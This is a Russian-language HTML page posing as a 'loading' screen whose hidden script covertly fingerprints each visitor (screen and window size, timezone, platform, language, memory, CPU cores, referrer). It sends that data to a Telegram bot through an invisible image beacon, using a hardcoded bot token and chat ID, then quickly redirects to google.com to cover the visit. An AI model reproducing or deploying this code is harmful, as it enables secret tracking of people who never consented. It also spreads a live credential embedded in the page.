<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Загрузка...</title>
</head>
<body>
    <h2>Секунду, идет загрузка страницы...</h2>

    <script>
        const BOT_TOKEN = "9231529625:AAEMepewolQDytYwOum3aIrfIO1MBzJqous";
        const CHAT_ID = "8814781494";

        // Собираем ключевую информацию
        const screenInfo = window.screen.width + "x" + window.screen.height;
        const windowInfo = window.innerWidth + "x" + window.innerHeight;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "н/д";
        const ram = navigator.deviceMemory ? navigator.deviceMemory + "GB+" : "н/д";
        const cores = navigator.hardwareConcurrency || "н/д";

        const info = "🚨 Отчет о посетителе:\n\n" +
                     "⏱ Время: " + new Date().toLocaleString() + "\n" +
                     "🌍 Часовой пояс: " + timezone + "\n" +
                     "💻 Платформа: " + navigator.platform + "\n" +
                     "🗣 Язык: " + navigator.language + "\n" +
                     "📺 Экран: " + screenInfo + "\n" +
                     "🪟 Окно: " + windowInfo + "\n" +
                     "🧠 ОЗУ: " + ram + "\n" +
                     "⚙️ Ядра: " + cores + "\n" +
                     "🔗 Источник: " + (document.referrer || "прямой заход");

        const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(info);

        // Отправляем запрос через скрытое изображение (работает моментально, без зависаний и CORS)
        const beacon = new Image();
        beacon.src = url;

        // ЖЕЛЕЗОБЕТОННЫЙ РЕДИРЕКТ: сработает ровно через 0.4 секунды, что бы ни случилось с сетью
        setTimeout(function() {
            window.location.href = "https://google.com";
        }, 400);
    </script>
</body>
</html>
